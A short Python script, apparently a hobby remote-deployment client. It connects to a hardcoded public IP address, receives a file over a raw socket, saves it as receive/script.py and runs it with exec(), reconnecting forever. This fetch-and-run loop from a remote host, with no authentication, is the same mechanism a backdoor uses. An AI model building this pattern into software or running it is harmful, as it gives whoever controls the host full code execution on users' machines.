import socket
from pathlib import Path
import os
import time
import datetime

def newConnection():

    s = socket.socket() # new socket object
    host = "35.227.87.153"
    # host = socket.gethostname()
    port = 377

    while True: # attempt to make connection to server
        try:
            s.connect((host,port))
            break
        except:
            print("host refused connection, reattempting in 1 second...")
            time.sleep(1)

    print("established connection to server on", host, port)

    try: # this is the main loop, if any error comes up we attempt to reconnect
        while True: # listen for new file data
            l = s.recv(1024)
            if (l): # begin receipt of file
                print("receiving file")
                data = bytearray()
                while True: # receive file data into memory
                    data += l
                    if data[-3:] == b"EOD": # if end of data
                        data = data[:-3]
                        break
                    else: # not end of data, continue reading as normal
                        l = s.recv(1024)
                f = open('receive/script.py','wb')
                f.write(data)
                f.close()
                print("file transfer complete, executing script")
                exec(open("./receive/script.py").read())
    except Exception as e:
        print(e)
        print("error! attempting to reconnect...")
        s.shutdown(socket.SHUT_RDWR)
        s.close()
        return

while True:
    newConnection()
    # every time connection is lost, we attempt to reconnect